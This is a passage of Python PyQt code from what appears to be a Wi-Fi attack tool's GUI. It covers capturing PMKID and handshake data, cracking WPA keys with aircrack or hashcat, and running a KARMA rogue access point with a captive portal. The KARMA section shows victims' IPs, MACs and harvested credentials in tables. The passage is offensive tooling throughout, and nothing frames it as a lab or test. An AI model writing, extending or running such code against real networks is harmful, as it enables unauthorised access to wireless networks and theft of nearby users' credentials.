                return {"success": False}

            res = self.orchestrator.hcxtools.extract_hashes(out, hash_out)
            return {"success": res.get("success", False), "file": hash_out}

        self.worker = WorkerThread(_do_pmkid)
        self.worker.finished.connect(self._on_capture_done)
        self.worker.start()

    def _on_capture_done(self, res):
        if isinstance(res, Exception) or not res.get("success"):
            self.lbl_result.setText("● Capture failed")
        else:
            self.lbl_cap_file.setText(res.get("file", ""))
            self.lbl_result.setText("● Captured!")
            self._refresh_wordlists()

    def _refresh_wordlists(self):
        self.wl_combo.clear()
        for w in self.orchestrator.list_wordlists():
            self.wl_combo.addItem(f"{w['name']} ({w['size_mb']}MB)", w["path"])

    def _browse_capture(self):
        f, _ = QFileDialog.getOpenFileName(
            self,
            "Select Capture",
            "/tmp",
            "Caps (*.cap *.pcap *.hc22000);;All (*)",
        )
        if f:
            self.lbl_cap_file.setText(f)

    def _browse_wordlist(self):
        f, _ = QFileDialog.getOpenFileName(
            self,
            "Select Wordlist",
            "/usr/share/wordlists",
            "Text (*.txt);;All (*)",
        )
        if f:
            self.wl_combo.insertItem(0, f"Custom ({Path(f).name})", f)
            self.wl_combo.setCurrentIndex(0)

    def _crack(self, engine="smart"):
        cap = self.lbl_cap_file.text()
        wl = self.wl_combo.currentData()
        if cap == "None" or not Path(cap).exists():
            return
        self.lbl_result.setText(f"● Cracking ({engine})…")

        def crack_task():
            if engine == "aircrack":
                return self.orchestrator.crack_handshake(
                    cap, wl, self.selected_bssid
                )
            elif engine == "hashcat" or str(cap).endswith(".hc22000"):
                hc_file = (
                    cap + ".hc22000" if not cap.endswith(".hc22000") else cap
                )
                if not cap.endswith(".hc22000"):
                    self.orchestrator.hcxtools.extract_hashes(cap, hc_file)
                return self.orchestrator.crack_hash(hc_file, wl, mode=22000)
            else:
                return self.orchestrator.crack_wpa_smart(
                    cap, wl, self.selected_bssid, self.selected_essid
                )

        self.worker = WorkerThread(crack_task)
        self.worker.finished.connect(self._on_crack_done)
        self.worker.start()

    def _on_crack_done(self, res):
        if isinstance(res, Exception):
            self.lbl_result.setText("● Error")
        elif res.get("found") or res.get("success"):
            k = res.get("key") or res.get("cracked_keys")
            self.lbl_result.setText(f"● KEY: {k}")
            show_toast(self.main_window, f"KEY FOUND: {k}")
        else:
            self.lbl_result.setText("● Not found")

    # KARMA
    def _start_karma(self):
        self.btn_karma_start.setEnabled(False)
        self.btn_karma_stop.setEnabled(True)
        self.karma_worker = AutoKarmaWorker(
            self.orchestrator,
            ssid=self.txt_ssid.text(),
            portal=self.combo_portal.currentText(),
        )
        self.karma_worker.log_signal.connect(self.karma_log.appendPlainText)
        self.karma_worker.status_signal.connect(self._update_karma_status)
        self.karma_worker.finished_signal.connect(self._on_karma_finished)
        self.karma_worker.start()

    def _stop_karma(self):
        if self.karma_worker:
            self.karma_worker.stop()

    def _update_karma_status(self, st):
        self.lbl_karma_clients.setText(
            f"💻 Clients: {st.get('client_count',0)}"
        )
        self.lbl_karma_dns.setText(f"🌐 DNS: {st.get('dns_count',0)}")
        self.lbl_karma_creds.setText(f"🔑 Creds: {st.get('cred_count',0)}")

        cli = st.get("clients", [])
        self.karma_clients_tbl.setRowCount(len(cli))
        for i, c in enumerate(cli):
            self.karma_clients_tbl.setItem(
                i, 0, QTableWidgetItem(c.get("ip", ""))
            )
            self.karma_clients_tbl.setItem(
                i, 1, QTableWidgetItem(c.get("mac", ""))
            )

        creds = st.get("creds", [])
        self.karma_creds_tbl.setRowCount(len(creds))
        for i, c in enumerate(creds):
            self.karma_creds_tbl.setItem(
                i, 0, QTableWidgetItem(c.get("_client_ip", ""))
            )
            payload = str(
                {k: v for k, v in c.items() if not k.startswith("_")}
            )
            self.karma_creds_tbl.setItem(i, 1, QTableWidgetItem(payload))

    def _on_karma_finished(self, ok):
        self.btn_karma_start.setEnabled(True)
        self.btn_karma_stop.setEnabled(False)
